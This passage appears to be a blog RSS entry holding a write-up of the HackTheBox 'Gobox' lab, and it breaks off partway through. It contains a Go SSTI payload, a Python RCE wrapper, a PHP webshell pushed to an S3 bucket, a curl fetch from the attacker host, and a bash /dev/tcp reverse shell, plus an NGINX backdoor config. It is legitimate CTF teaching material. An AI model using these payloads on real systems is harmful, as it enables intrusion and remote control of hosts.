@@ -8,6 +8,564 @@
     <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/webshell/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Gobox</title>
+      <link>https://fahmifj.github.io/hackthebox/gobox/</link>
+      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/gobox/</guid>
+      <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
+      <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows  me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p>
+<p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>Golang SSTI</li>
+<li>Source Code Analysis</li>
+<li>Scripting</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ fscan 10.10.11.113 gobox
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.113
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    nginx
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
+8080/tcp open  http    nginx
+<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
+<p>The site on port 80 is a Hacking eSports homepage.</p>
+<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
+</p>
+<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog is based on Go).</p>
+<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
+</p>
+<p>Nothing else to see here.</p>
+<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
+<p>On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.</p>
+<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
+</p>
+<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ curl -s -I http://10.10.11.113:8080       
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx
+Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
+Connection: keep-alive
+X-Forwarded-Server: golang
+</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
+<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
+</p>
+<p>The following is how the HTTP request and the HTTP response look like.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="container-root">Container root</h3>
+<h4 id="ssti">SSTI</h4>
+<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
+</code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
+<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
+</p>
+<p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
+</p>
+<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
+<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
+</p>
+<h4 id="rce">RCE</h4>
+<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
+<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="o">...</span>
+</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
+</p>
+<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
+<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
+</p>
+<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">cmd</span>
+<span class="kn">import</span> <span class="nn">html</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="c1"># hacky curly braces</span>
+<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
+<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
+	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+
+<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
+	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>
+
+	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
+		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
+	<span class="k">try</span><span class="p">:</span>	
+		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
+	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
+$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+&gt; uname -a
+Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="s3-enumeration">S3 enumeration</h4>
+<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
+&gt; aws 
+usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
+To see <span class="nb">help</span> text, you can run:
+
+  aws <span class="nb">help</span>
+  aws &lt;command&gt; <span class="nb">help</span>
+  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
+aws: error: the following arguments are required: <span class="nb">command</span>
+</code></pre></div><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
+2021-09-07 07:32:42 website
+</code></pre></div><p>The bucket contains 4 files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
+PRE css/
+2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
+2021-09-07 07:32:42     <span class="m">165551</span> header.png
+2021-09-07 07:32:42          <span class="m">5</span> index.html
+2021-09-07 07:32:42       <span class="m">1803</span> index.php
+</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
+download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
+&gt; cat /tmp/id.php
+&lt;!DOCTYPE html&gt;
+&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+
+&lt;head&gt;
+  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
+  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I also find that I have write access on this bucket.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+&gt; aws s3 cp /tmp/iamf.php s3://website/
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+</code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
+<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
+</p>
+<p>Also, instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p>
+<h4 id="webshell">Webshell</h4>
+<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
+$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
+PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
+</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
+
+&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
+upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
+</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
+<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
+bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
+</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
+</code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
+<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
+</p>
+<p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@gobox:/opt/website$
+</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@gobox:/opt/website$ ^Z
+<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «gobox» «10.10.14.97»
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
+www-data@gobox:/opt/website$
+</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+www-data@gobox:/$ ls -lR /home/ubuntu
+/home/ubuntu:
+total <span class="m">4</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
+www-data@gobox:/$ cat /home/ubuntu/user.txt
+d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href="#explore">explore</a> section).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
+
+
+        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>
+
+        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>
+
+        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>
+
+
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
+                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1"># Homepage
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
+        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
+        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
+
+        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
+            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>
+
+
+            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># Login page
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
+        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># unknown
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
+<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nmap -sV -sC -p4566 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
+Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
+Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
